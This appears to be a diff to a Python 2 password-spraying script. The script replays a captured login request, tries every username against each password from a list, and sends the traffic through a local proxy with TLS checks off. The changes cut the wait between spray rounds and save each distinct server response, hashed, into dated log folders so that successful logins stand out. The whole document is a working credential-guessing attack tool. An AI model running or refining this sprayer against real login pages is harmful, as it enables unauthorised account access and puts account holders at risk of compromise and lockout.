@@ -1,11 +1,19 @@
 #!/usr/bin/python
 
 import requests
+import os
 import sys
 import time
+import hashlib
 
+# Supporting variables/work
 proxies = {'http' : 'http://10.10.110.100:8080'}
-sleepTimeMinutes = 0.25
+sleepTimeMinutes = 0.05
+sleepTimeSeconds = int(round(sleepTimeMinutes*60))
+if not os.path.exists("logs"):
+    os.makedirs("logs")
+
+################################################################################
 
 # Parse request file
 requestsFile = open('request.txt', 'r')
@@ -38,6 +46,14 @@ for key,value in dataDict.iteritems():
 
 # Spray
 for password in passwordsList:
+
+    # Get time right before spray
+    date = time.strftime("%m.%d.%Y", time.gmtime())
+    tyme = time.strftime("%H:%M:%S", time.gmtime())
+
+    responseDict = {}
+
+    # Perform spray
     for username in usernamesList:
         # Load injection points
         dataDict[usernameKey] = username
@@ -45,10 +61,35 @@ for password in passwordsList:
         
         # Attempt login
         print "Attemping " + username + ':' + password
-        r = requests.post("http://" + headerDict["Host"] + endPoint, \
-                headers=headerDict, data=dataDict, proxies=proxies, verify=False)
+        url = "http://" + headerDict["Host"] + endPoint
+        response = requests.post(url=url, headers=headerDict, data=dataDict, proxies=proxies, verify=False)
 
-        # Examine response length
-        print len(r.content)
-    time.sleep(int(round(sleepTimeMinutes*60)))
+        # Create hash of response
+        checksummer = hashlib.md5()
+        checksummer.update(response.content)
+
+        # Store hash of response. Chance of collision but very minimal.
+        responseDict[checksummer.hexdigest()] = response
+
+    # Create file
+    if not os.path.exists("logs/" + date):
+        os.makedirs("logs/" + date)
+    if not os.path.exists("logs/" + date + '/' + tyme):
+        os.makedirs("logs/" + date + '/' + tyme)
+
+    # Write to file. Files are named with hashes that distinguish between unique responses.
+    for key,value in responseDict.iteritems():
+        fileOut = open("logs/" + date + '/' + tyme + '/' + key + ".html", 'w')
+        fileOut.write(str(value.request.url) + '\n\n')
+        for k2,v2 in value.request.headers.iteritems():
+            fileOut.write(k2 + ": " + v2 + "\n")
+        fileOut.write('\n' + str(value.request.body))
+        fileOut.write('\n' + "-"*80 + "\n\n")
+        for k2,v2 in value.headers.iteritems():
+            fileOut.write(k2 + ": " + v2 + "\n")
+        fileOut.write(value.text)
+        fileOut.close()
+
+    time.sleep(sleepTimeSeconds)
+
 
